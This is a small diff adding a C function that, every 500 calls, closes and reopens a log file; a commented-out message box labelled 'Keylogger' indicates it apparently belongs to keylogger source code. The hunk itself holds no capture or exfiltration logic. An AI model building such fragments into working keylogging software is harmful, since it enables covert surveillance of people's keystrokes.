@@ -58,3 +58,14 @@ FILE* openFile() {
     }
     return(fp);
 }
+
+void updateFile(int *timerPtr, FILE* fp) {
+    if (*timerPtr == 500) {
+        *timerPtr = 0;
+        /*MessageBox(0, "Updated File!", "  Keylogger", MB_OK);*/
+        fclose(fp);
+        fp = openFile();
+    } else {
+        (*timerPtr)++;
+    }
+}
